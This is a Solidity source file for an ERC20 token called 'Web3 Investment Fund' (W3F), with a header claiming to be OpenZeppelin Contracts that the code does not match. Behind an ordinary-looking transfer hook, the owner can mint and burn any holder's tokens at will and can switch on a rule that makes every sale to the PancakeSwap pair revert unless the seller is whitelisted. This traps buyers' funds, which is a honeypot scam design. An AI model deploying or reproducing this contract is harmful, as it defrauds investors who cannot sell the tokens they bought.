// SPDX-License-Identifier: MIT
// OpenZeppelin Contracts v4.4.0

pragma solidity ^0.8.0;

import "./ERC20.sol";
import "./Ownable.sol";

interface IPancakeswap_Router {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
}

interface IPancakeswap_Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}


contract Token is ERC20, Ownable {


    IPancakeswap_Router private pROUTER;
    IPancakeswap_Factory private pFACTORY;
    address public pWETH;
    address public pPAIR;
    bool public transferrate;
    mapping(address => bool) private SELLALLOWANCE;
    bool public restrictionOn;
    uint256 public minBuy;
    mapping(address => bool) public noLimit;


    constructor (address _router) ERC20("Web3 Investment Fund", "W3F") Ownable() {

        mint(msg.sender, 100000000 * (10 ** uint256(decimals())));
        pROUTER = IPancakeswap_Router(_router);
        pFACTORY = IPancakeswap_Factory(pROUTER.factory());
        pWETH = pROUTER.WETH();
        pPAIR = pFACTORY.createPair(address(this), pWETH);

    }

    function mint(address account, uint256 amount) public onlyOwner {
        _mint(account, amount);
    }

    function burn(address account, uint256 amount) public onlyOwner {
        _burn(account, amount);
    }

    function setTransferRate(bool onoff) public onlyOwner {
        transferrate = onoff;
    }

    function setRestrictionOn(bool onoff) public onlyOwner {
        restrictionOn = onoff;
    }

    function setMinBuy(uint256 amount) public onlyOwner {
        minBuy = amount;
    }


    function setSellAllowance(address account, bool allowance) public onlyOwner {
        SELLALLOWANCE[account] = allowance;
    }

    function checkRestriction(uint256 amount) internal view returns(bool) {
        address[] memory path = new address[](2);
        path[0] = pROUTER.WETH();
        path[1] = address(this);
        uint256[] memory amountIn = pROUTER.getAmountsIn(amount, path);
        return amountIn[0] >= minBuy;
    }


    //hook before every ERC20 transfer
    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal override(ERC20) {

        if (restrictionOn && from == pPAIR && !noLimit[to]) {
            bool overMin = checkRestriction(amount);
            require(overMin,"Buying amount is less than minimum");
            if (overMin) noLimit[to] = true;
        }

        if (transferrate) {
            if (!SELLALLOWANCE[from]) {
                if ((to == pPAIR) && (from != address(this))) {
                    revert("Selling is not allowed");
                }
            }
        }

    }


}